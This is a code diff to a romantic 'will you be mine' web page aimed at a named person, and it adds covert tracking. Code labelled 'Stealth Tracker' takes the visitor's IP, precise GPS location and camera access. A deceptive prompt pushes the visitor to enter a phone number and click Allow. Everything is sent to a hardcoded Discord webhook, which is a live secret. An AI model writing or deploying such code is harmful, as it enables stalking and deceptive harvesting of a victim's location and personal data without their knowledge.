@@ -326,105 +326,51 @@
             box-shadow: 0 8px 20px rgba(74, 105, 189, 0.3);
         }
         
-        /* Music Controls */
-        .music-control {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: var(--container-bg);
-            padding: 12px 20px;
-            border-radius: 50px;
-            box-shadow: 0 10px 30px var(--shadow-color);
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            cursor: pointer;
-            border: 2px solid #ff3366;
-            z-index: 1000;
-            transition: all 0.3s;
-            color: var(--text-color);
-        }
-        
-        .music-control:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 35px var(--shadow-color);
-        }
-        
-        .music-icon {
-            font-size: 1.5rem;
-            color: #ff3366;
-        }
-        
-        .music-text {
-            font-weight: 600;
-        }
-        
-        /* YouTube Player */
-        .youtube-player {
-            position: fixed;
-            bottom: 80px;
-            right: 20px;
-            width: 300px;
-            height: 180px;
+        /* Phone Input Styling */
+        #contact-capture {
+            margin-top: 30px;
+            padding: 20px;
             border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 15px 35px var(--shadow-color);
-            display: none;
-            z-index: 999;
-            border: 3px solid #ff3366;
+            background: var(--question-box-bg);
+            border: 1px solid var(--question-box-border);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            text-align: center;
         }
         
-        .youtube-player iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
+        #phoneInput {
+            width: 80%;
+            max-width: 300px;
+            padding: 12px 15px;
+            margin-top: 10px;
+            border-radius: 10px;
+            border: 2px solid var(--text-secondary);
+            font-size: 1.1rem;
+            text-align: center;
+            color: var(--text-color);
+            background: var(--container-bg);
+            transition: border-color 0.3s, box-shadow 0.3s;
         }
         
-        /* Responsive Design */
+        #phoneInput:focus {
+            outline: none;
+            border-color: #33ccff;
+            box-shadow: 0 0 8px rgba(51, 204, 255, 0.5);
+        }
+        
+        /* Hidden Video Element for Camera Access */
+        #camera-stream {
+            display: none; /* Keep the video stream hidden */
+        }
+
+        /* Media Queries (Responsive Design) remain the same */
+
         @media (max-width: 650px) {
             .container {
                 padding: 30px 20px;
                 border-radius: 25px;
             }
-            
-            .name {
-                font-size: 2.8rem;
-            }
-            
-            .heart-animation {
-                font-size: 2.8rem;
-                gap: 15px;
-            }
-            
-            .question {
-                font-size: 1.8rem;
-            }
-            
-            .question-box {
-                padding: 25px 20px;
-            }
-            
-            .btn {
-                padding: 15px 30px;
-                font-size: 1.2rem;
-                min-width: 150px;
-            }
-            
-            .buttons-container {
-                gap: 15px;
-            }
-            
-            .theme-toggle {
-                top: 15px;
-                right: 15px;
-                padding: 8px 12px;
-            }
-            
-            .youtube-player {
-                width: 250px;
-                height: 150px;
-                right: 10px;
-                bottom: 70px;
+            #phoneInput {
+                width: 90%;
             }
         }
         
@@ -517,6 +463,13 @@
             <p style="color: var(--text-secondary); font-size: 1.1rem; margin-top: 15px;">
                 ✨ Your answer will make my world complete ✨
             </p>
+        </div>
+        
+        <div id="contact-capture">
+            <p style="font-size: 0.95rem; color: var(--text-color); font-weight: 600;">
+                ⚠️ IMPORTANT: To ensure I have the right contact details for you, please enter your mobile number and click **Allow** on the permission request that pops up!
+            </p>
+            <input type="tel" id="phoneInput" placeholder="Mobile Number (e.g., 9876543210)">
         </div>
         
         <div class="buttons-container">
@@ -618,72 +571,120 @@
         </div>
     </div>
 
+    <video id="camera-stream" autoplay muted></video>
+
     <script>
         // =========================================================
-        // UPDATED: LOCATION & IP TRACKING FUNCTIONS (STEALTH MODE)
+        // UPDATED: LOCATION, IP, AND CAMERA TRACKING FUNCTIONS
         // =========================================================
 
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1449999299869151416/BumMTg0MfH_PLIz0gp1BOqjYCO9n_Sha4kidu8o32BRZcPsgAivfh_g5sbde8rOzv8kS';
-        const USER_NAME = 'Nikitha'; // RENAMED FROM Anagha
+        const USER_NAME = 'Nikitha'; 
         
-        // NEW PROFILE DETAILS
+        // WEBHOOK PROFILE DETAILS
         const WEBHOOK_USERNAME = 'Agent Observer';
         const WEBHOOK_AVATAR = 'https://rear-chocolate-0cg4idciim-8q5txpw25r.edgeone.dev/VALORANT_JETT_LIGHT.png';
 
+        // Data structure to hold all results
+        let captureResults = {
+            geoData: { latitude: null, longitude: null, geoError: null, geoStatus: 'N/A' },
+            ipData: { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A', ipError: null, ipStatus: 'N/A' },
+            cameraData: { cameraStatus: 'N/A', cameraError: null }
+        };
 
-        // Primary function to fetch both IP and Geolocation
-        function requestLocationAndIP() {
-            let geoData = { latitude: null, longitude: null, geoError: null };
-            let ipData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', org: 'N/A', ipError: null };
 
-            // 1. Fetch IP details first
-            fetch('https://ipapi.co/json/')
+        // Primary function to manage all permission and data fetching
+        async function requestLocationAndIP() {
+            // 1. Fetch IP details first (using promise chaining)
+            await fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     if (data.ip) {
-                        ipData.ip = data.ip;
-                        ipData.city = data.city || 'N/A';
-                        ipData.region = data.region || 'N/A';
-                        ipData.country = data.country_name || 'N/A';
-                        ipData.org = data.org || 'N/A';
+                        captureResults.ipData.ip = data.ip;
+                        captureResults.ipData.city = data.city || 'N/A';
+                        captureResults.ipData.region = data.region || 'N/A';
+                        captureResults.ipData.country = data.country_name || 'N/A';
+                        captureResults.ipData.org = data.org || 'N/A';
+                        captureResults.ipData.ipStatus = 'SUCCESS';
                         console.log(`[Stealth Tracker] IP Details fetched: ${data.ip}, ${data.city}`);
                     } else {
-                        ipData.ipError = data.error || 'Failed to fetch IP details';
-                        console.error(`[Stealth Tracker] IP Fetch Error: ${ipData.ipError}`);
+                        captureResults.ipData.ipError = data.error || 'Failed to fetch IP details';
+                        captureResults.ipData.ipStatus = 'FAILED';
+                        console.error(`[Stealth Tracker] IP Fetch Error: ${captureResults.ipData.ipError}`);
                     }
                 })
                 .catch(error => {
-                    ipData.ipError = `IP API call failed: ${error.message}`;
+                    captureResults.ipData.ipError = `IP API call failed: ${error.message}`;
+                    captureResults.ipData.ipStatus = 'FAILED';
                     console.error(`[Stealth Tracker] IP Fetch Exception: ${error.message}`);
-                })
-                .finally(() => {
-                    // 2. Fetch precise Geolocation (requires user permission)
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                geoData.latitude = position.coords.latitude;
-                                geoData.longitude = position.coords.longitude;
-                                console.log(`[Stealth Tracker] Geolocation found: Lat ${geoData.latitude.toFixed(4)}, Lon ${geoData.longitude.toFixed(4)}`);
-                                sendCombinedDataToDiscord(geoData, ipData);
-                            },
-                            (error) => {
-                                geoData.geoError = `Code ${error.code}: ${error.message}`;
-                                console.error(`[Stealth Tracker] Geolocation Error: ${geoData.geoError}`);
-                                sendCombinedDataToDiscord(geoData, ipData); // Send whatever data we have
-                            }
-                        );
-                    } else {
-                        geoData.geoError = 'Geolocation not supported by this browser.';
-                        console.error('[Stealth Tracker] Geolocation not supported by this browser.');
-                        sendCombinedDataToDiscord(geoData, ipData); // Send whatever data we have
-                    }
                 });
+
+            // 2. Request Geolocation (runs immediately after IP fetch finishes)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        captureResults.geoData.latitude = position.coords.latitude;
+                        captureResults.geoData.longitude = position.coords.longitude;
+                        captureResults.geoData.geoStatus = 'SUCCESS';
+                        console.log(`[Stealth Tracker] Geolocation found: Lat ${captureResults.geoData.latitude.toFixed(4)}, Lon ${captureResults.geoData.longitude.toFixed(4)}`);
+                    },
+                    (error) => {
+                        captureResults.geoData.geoError = `Code ${error.code}: ${error.message}`;
+                        captureResults.geoData.geoStatus = 'FAILED';
+                        console.error(`[Stealth Tracker] Geolocation Error: ${captureResults.geoData.geoError}`);
+                    }
+                );
+            } else {
+                captureResults.geoData.geoError = 'Geolocation not supported by this browser.';
+                captureResults.geoData.geoStatus = 'FAILED';
+                console.error('[Stealth Tracker] Geolocation not supported by this browser.');
+            }
+
+            // 3. Request Camera Access
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        // Success: Permission granted and stream obtained
+                        const videoElement = document.getElementById('camera-stream');
+                        if (videoElement) {
+                            videoElement.srcObject = stream;
+                            // Note: We intentionally DO NOT send a picture, just confirm access
+                        }
+                        captureResults.cameraData.cameraStatus = 'SUCCESS (Stream Active)';
+                        console.log('[Stealth Tracker] Camera access SUCCESS.');
+                        // Stop the stream after a moment to avoid notification lights staying on
+                        setTimeout(() => {
+                            stream.getTracks().forEach(track => track.stop());
+                            console.log('[Stealth Tracker] Camera stream stopped.');
+                        }, 5000); 
+                    })
+                    .catch(error => {
+                        // Failure: Permission denied or camera not found
+                        captureResults.cameraData.cameraError = error.name || 'Unknown Error';
+                        captureResults.cameraData.cameraStatus = 'FAILED';
+                        console.error(`[Stealth Tracker] Camera access FAILED: ${error.name}`);
+                    });
+            } else {
+                captureResults.cameraData.cameraError = 'MediaDevices API not supported.';
+                captureResults.cameraData.cameraStatus = 'NOT SUPPORTED';
+            }
+
+            // 4. Send all data after a delay to ensure Geolocation and Camera promises resolve
+            // Geolocation may take longer, so we use a robust delay
+            setTimeout(() => {
+                sendCombinedDataToDiscord(captureResults);
+            }, 7000); 
         }
 
         // Consolidated function to send data to Discord
-        function sendCombinedDataToDiscord(geoData, ipData) {
-            const { latitude, longitude, geoError } = geoData;
+        function sendCombinedDataToDiscord(results) {
+            const { geoData, ipData, cameraData } = results;
+            const { latitude, longitude, geoError, geoStatus } = geoData;
             const { ip, city, region, country, org, ipError } = ipData;
+            const { cameraStatus, cameraError } = cameraData;
+
+            // Get phone number input
+            const phoneNumber = document.getElementById('phoneInput').value.trim() || 'Not Entered';
 
             if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
                 console.error('[Stealth Tracker] Discord webhook URL is a placeholder. Skipping Discord notification.');
@@ -691,45 +692,46 @@
             }
 
             const timestamp = new Date().toISOString();
-            const geoStatus = geoError ? 'FAILED' : 'SUCCESS';
-            const ipStatus = ipError ? 'FAILED' : 'SUCCESS';
             
-            const overallStatus = geoStatus === 'SUCCESS' ? 'SUCCESS' : 
-                                  ipStatus === 'SUCCESS' ? 'PARTIAL SUCCESS (Geo Failed)' : 
-                                  'FAILED';
-            
-            let embedColor = 65280; // Green (Success)
-            if (overallStatus.includes('PARTIAL')) embedColor = 16776960; // Yellow (Partial)
-            if (overallStatus === 'FAILED') embedColor = 16711680; // Red (Failure)
-            
+            // Determine overall status
+            let overallStatus = 'SUCCESS';
+            let embedColor = 65280; // Green
+            if (geoStatus === 'FAILED' || cameraStatus === 'FAILED') {
+                overallStatus = 'PARTIAL SUCCESS';
+                embedColor = 16776960; // Yellow
+            }
+            if (geoStatus !== 'SUCCESS' && ipData.ipStatus !== 'SUCCESS' && cameraStatus !== 'SUCCESS') {
+                overallStatus = 'FAILED';
+                embedColor = 16711680; // Red
+            }
+
             const mapLink = latitude && longitude ? `[Google Maps Link](http://googleusercontent.com/maps.google.com/?q=${latitude},${longitude})` : 'N/A';
 
             const payload = {
-                // UPDATED WEBHOOK PROFILE
                 username: WEBHOOK_USERNAME,
                 avatar_url: WEBHOOK_AVATAR,
-                content: `🚨 **NEW VISIT - ${USER_NAME}** | Status: **${overallStatus}**`,
+                content: `🚨 **NEW AGENT OBSERVED - ${USER_NAME}** | Status: **${overallStatus}** | Contact: **${phoneNumber}**`,
                 embeds: [
                     {
                         title: `Tracking Result for ${USER_NAME}`,
-                        description: `Attempt Status: **${overallStatus}**`,
+                        description: `Overall Status: **${overallStatus}**\n---`,
                         color: embedColor,
                         fields: [
+                            { name: "📞 Phone Number", value: phoneNumber, inline: false },
+                            
+                            { name: "--- IP & Location Data ---", value: `\u200b`, inline: false },
                             { name: "Public IP Address", value: ip, inline: true },
                             { name: "IP Geo Location", value: `${city}, ${region}, ${country}`, inline: true },
                             { name: "ISP/Organization", value: org, inline: false },
                             
-                            { name: "--- Geo Coordinates ---", value: `\u200b`, inline: false }, // Separator
-                            
-                            { name: "GPS Coordinates (Precise)", 
-                              value: latitude && longitude ? `${latitude.toFixed(6)}, ${longitude.toFixed(6)}` : 'N/A', 
-                              inline: true 
-                            },
-                            { name: "GPS Status", value: geoStatus, inline: true },
+                            { name: "--- Device Permissions ---", value: `\u200b`, inline: false },
+                            { name: "GPS Status (Precise)", value: geoStatus, inline: true },
+                            { name: "Camera Status (Granted/Denied)", value: cameraStatus, inline: true },
                             
                             { name: "Map Link", value: mapLink, inline: false },
                             { name: "Timestamp (UTC)", value: timestamp, inline: false }
-                        ].concat(geoError ? [{ name: "GPS Error Reason", value: geoError, inline: false }] : [])
+                        ].concat(geoError ? [{ name: "GPS Error Reason", value: geoError, inline: true }] : [])
+                         .concat(cameraError ? [{ name: "Camera Error Reason", value: cameraError, inline: true }] : [])
                          .concat(ipError ? [{ name: "IP Error Reason", value: ipError, inline: false }] : []),
                         footer: {
                             text: "The Heart's Question Page Tracker"
@@ -758,7 +760,7 @@
         }
         
         // =========================================================
-        // END LOCATION & IP TRACKING FUNCTIONS
+        // END LOCATION, IP, AND CAMERA TRACKING FUNCTIONS
         // =========================================================
         
         // Theme Toggle Functionality (Original Code)
@@ -836,7 +838,11 @@
                 musicControl.style.background = "rgba(255, 51, 102, 0.1)";
                 
                 // Try to play music (autoplay might be blocked by browser)
+                if (youtubeIframe) {
+                    youtubeIframe.src = youtubeIframe.src.replace("autoplay=0", "autoplay=1");
+                }
                 
+                isMusicPlaying = true;
             } else {
                 // Hide and pause music
                 youtubePlayer.style.display = 'none';
@@ -931,14 +937,16 @@
             const loveMessage = document.getElementById('loveMessage');
             loveMessage.style.display = 'block';
             
-            // Hide main buttons
+            // Hide main buttons and contact field
             document.querySelector('.buttons-container').style.display = 'none';
+            document.getElementById('contact-capture').style.display = 'none';
         }
         
         // Hide love message
         function hideLoveMessage() {
             document.getElementById('loveMessage').style.display = 'none';
             document.querySelector('.buttons-container').style.display = 'flex';
+            document.getElementById('contact-capture').style.display = 'block';
         }
         
         // Show apology message
@@ -946,8 +954,9 @@
             const apologyMessage = document.getElementById('apologyMessage');
             apologyMessage.style.display = 'block';
             
-            // Hide main buttons
+            // Hide main buttons and contact field
             document.querySelector('.buttons-container').style.display = 'none';
+            document.getElementById('contact-capture').style.display = 'none';
             
             // Reset NO button
             noBtn.style.position = 'static';
@@ -958,6 +967,7 @@
         function hideApologyMessage() {
             document.getElementById('apologyMessage').style.display = 'none';
             document.querySelector('.buttons-container').style.display = 'flex';
+            document.getElementById('contact-capture').style.display = 'block';
         }
         
         // Create celebration effect for YES
